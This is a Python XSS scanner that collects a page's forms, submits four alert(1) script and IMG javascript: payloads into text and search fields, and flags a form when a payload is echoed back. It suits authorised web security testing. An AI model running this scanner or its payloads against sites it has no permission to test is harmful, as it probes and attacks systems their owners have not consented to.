import requests
from pprint import pprint
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
from tkinter import messagebox
from webbrowser import open_new_tab
import threading 

def get_all_forms(url):
    soup = bs(requests.get(url).content, "html.parser")
    return soup.find_all("form")

def get_form_details(form):
    details = {}
    action = form.attrs.get("action").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def submit_form(form_details, url, value):
    target_url = urljoin(url, form_details["action"])
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            data[input_name] = input_value

    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)
    
def scan_xss(url):
    form_details = []
    forms = get_all_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")
    js_script={
     "<ScripT>alert(1)</ScripT>",
     "<IMG SRC=javascript:alert(&quot;XSS&quot;)>",
     "<IMG SRC=`javascript:alert(1)`>",
     "<script>alert(1)</script>",
     }
    
    is_vulnerable = False
    for form in forms:
        form_details = get_form_details(form)
        for script in js_script:
            content = submit_form(form_details, url, script).content.decode()
            if script in content:
                print(f"[+] XSS Detected on {url}")
                print(f"[*] Form details:")
                pprint(form_details)
                is_vulnerable = True
                break
                
    if is_vulnerable == True:
        #messagebox.showinfo("Title", "Store XSS Vulnerability found ... ")
        #print(is_vulnerable)
        return is_vulnerable,form_details,script
    else:
        #messagebox.showinfo("Title", "Store Xss Vulnerability not found  ...")
        return is_vulnerable,form_details,script